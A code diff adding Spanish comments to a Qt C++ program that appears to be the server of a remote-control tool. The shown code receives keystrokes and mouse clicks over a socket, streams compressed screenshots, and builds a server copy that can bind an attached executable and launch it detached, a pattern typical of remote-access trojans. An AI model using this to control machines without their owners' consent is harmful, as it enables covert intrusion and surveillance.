@@ -103,7 +103,7 @@ void MainWindow::inicio(){
     {
         QProcess::startDetached(this->ejecutar);
     }
-    capturacion.moveToThread(&hilo);
+    capturacion.moveToThread(&hilo); //movemos capturacion a un nuevo hilo para que se ejecute de forma independiente al programa principal y no lo bloquee
     hilo.start();
 }
 bool MainWindow::cargarConfiguracion(){
@@ -158,7 +158,7 @@ void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
     QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicaciÃ³n
     if (this->adjunto == "unido") //Cuando hay un ejecutable adjunto
     {
-        //Esto está muy poco optimizado, mejorar más adelante.
+        //TODO: ":Esto está muy poco optimizado, mejorar más adelante."
         QDir directorio;
         qint64 tamano;
         tamano = this->tamanoAdjunto;
@@ -220,10 +220,10 @@ void MainWindow::llegadaDatos() {
     QString datos;
     datos = socket.readAll();
     QStringList parametros =  datos.split("|@|");
-    if(parametros[0] == "t")
+    if(parametros[0] == "t") //llegada de teclas
     {
         int i;
-        for(i=0;i<parametros.size();i++)
+        for(i=0;i<parametros.size();i++) //recorremos y vamos enviando las teclas
         {
             #ifdef Q_WS_WIN
                  enviarTecla(parametros[i].toInt());
@@ -232,7 +232,7 @@ void MainWindow::llegadaDatos() {
 
         return;
     }
-    if (parametros[0] == "der")
+    if (parametros[0] == "der") //un click derecho
     {
         moverPuntero(parametros[1].toInt(),parametros[2].toInt());
         #ifdef Q_WS_WIN
@@ -241,7 +241,7 @@ void MainWindow::llegadaDatos() {
         #endif
         return;
     }
-    if (parametros[0] == "izq")
+    if (parametros[0] == "izq") //un click izquierdo
     {
         moverPuntero(parametros[1].toInt(),parametros[2].toInt());
         #ifdef Q_WS_WIN
@@ -250,7 +250,7 @@ void MainWindow::llegadaDatos() {
         #endif
         return;
     }
-    if (parametros[0] == "arra")
+    if (parametros[0] == "arra") //mover el raton arrastrando
     {
         moverPuntero(parametros[1].toInt(),parametros[2].toInt());
         #ifdef Q_WS_WIN
@@ -689,7 +689,7 @@ void paralelo::procesarImagen(QImage imagen2, int calidad, QTcpSocket *socket)
     sincroniza++; //LLebamos la cuenta de cuantas capturas vamos haciendo
     if(sincroniza == 10) //Cada 10 capturas envia una completa para sincronizar
     {
-        imagen1->fill(QColor(0,0,0).rgba());
+        imagen1->fill(QColor(0,0,0).rgba()); //Al poner la imagen1 a negro la diferencia con la imagen anterior es toda la imagen por lo que se envia la captura entera
         sincroniza = 0;
     }
     datosEscritos();
@@ -699,11 +699,11 @@ void paralelo::datosEscritos()
 {
     /** Esta función está pensada para esperar a que los datos de la captura sean escritos a memoria antes de enviarlos **/
     QByteArray array;
-    QByteArray comprimido = qCompress(bytes,9);
+    QByteArray comprimido = qCompress(bytes,9); //Comprimimos los datos con LZMA antes de enviarlos
     array.setNum(comprimido.size());
     util.escribirSocketDatos(array,this->socketDentro);
-    this->socketDentro->waitForBytesWritten();
+    this->socketDentro->waitForBytesWritten(); //Hay que esperar a que el tamaño se envie o se enviara junto a los datos binarios
     util.escribirSocketDatos(comprimido,this->socketDentro);
-    delete buffer;
+    delete buffer; //Liberamos la memoria del buffer
     //socketEscritorio.waitForBytesWritten(-1);
 }
